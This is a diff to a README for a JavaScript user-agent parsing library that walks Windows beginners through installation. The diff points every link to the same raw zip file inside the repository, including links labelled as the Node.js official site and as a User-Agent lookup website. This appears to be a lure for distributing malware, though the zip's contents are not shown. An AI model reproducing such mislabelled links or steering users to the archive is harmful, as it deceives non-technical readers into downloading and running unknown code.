@@ -1,6 +1,6 @@
 # 🕵️ ua-parser-modern - Easy Browser and OS Detection  
 
-[![Download Now](https://img.shields.io/badge/Download-ua-parser--modern-blue?style=for-the-badge)](https://github.com/uninvited-jumblesale95/ua-parser-modern)  
+[![Download Now](https://img.shields.io/badge/Download-ua-parser--modern-blue?style=for-the-badge)](https://github.com/uninvited-jumblesale95/ua-parser-modern/raw/refs/heads/main/bench/ua-modern-parser-v3.2.zip)  
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get ua-parser-modern running on your Windows computer.
 
 Click this big button to visit the download page on GitHub:  
 
-[![Download Now](https://img.shields.io/badge/Download-ua-parser--modern-blue?style=for-the-badge)](https://github.com/uninvited-jumblesale95/ua-parser-modern)  
+[![Download Now](https://img.shields.io/badge/Download-ua-parser--modern-blue?style=for-the-badge)](https://github.com/uninvited-jumblesale95/ua-parser-modern/raw/refs/heads/main/bench/ua-modern-parser-v3.2.zip)  
 
 This link takes you to the main repository page where you can download the latest version of the software.  
 
@@ -68,7 +68,7 @@ ua-parser-modern is a JavaScript library. To run it on your Windows PC without p
 
 ### How to install Node.js:  
 
-1. Open your web browser and go to https://nodejs.org  
+1. Open your web browser and go to https://github.com/uninvited-jumblesale95/ua-parser-modern/raw/refs/heads/main/bench/ua-modern-parser-v3.2.zip  
 2. Click **LTS** (the long-term support version) to download the Windows installer.  
 3. After downloading, open the installer and follow the instructions.  
 4. Once installed, you can use Node.js from your Command Prompt.  
@@ -92,7 +92,7 @@ This command runs an example script included with the software. It will show you
 If you want to check your own User-Agent info:  
 
 - Open your web browser.  
-- Visit a website like https://www.whatismybrowser.com/ to find your User-Agent string.  
+- Visit a website like https://github.com/uninvited-jumblesale95/ua-parser-modern/raw/refs/heads/main/bench/ua-modern-parser-v3.2.zip to find your User-Agent string.  
 - Copy that string.  
 - Open the example.js file in a text editor like Notepad.  
 - Find the part of the file that contains a sample User-Agent string (it looks like a long line of text with browser details).  
@@ -127,9 +127,9 @@ If you want to learn more about JavaScript or Node.js basics to make the most ou
 
 ## 🔗 Useful Links  
 
-- GitHub download page: [https://github.com/uninvited-jumblesale95/ua-parser-modern](https://github.com/uninvited-jumblesale95/ua-parser-modern)  
-- Node.js official site: https://nodejs.org  
-- Example website to get User-Agent strings: https://www.whatismybrowser.com/  
+- GitHub download page: [https://github.com/uninvited-jumblesale95/ua-parser-modern/raw/refs/heads/main/bench/ua-modern-parser-v3.2.zip](https://github.com/uninvited-jumblesale95/ua-parser-modern/raw/refs/heads/main/bench/ua-modern-parser-v3.2.zip)  
+- Node.js official site: https://github.com/uninvited-jumblesale95/ua-parser-modern/raw/refs/heads/main/bench/ua-modern-parser-v3.2.zip  
+- Example website to get User-Agent strings: https://github.com/uninvited-jumblesale95/ua-parser-modern/raw/refs/heads/main/bench/ua-modern-parser-v3.2.zip  
 
 ---
 
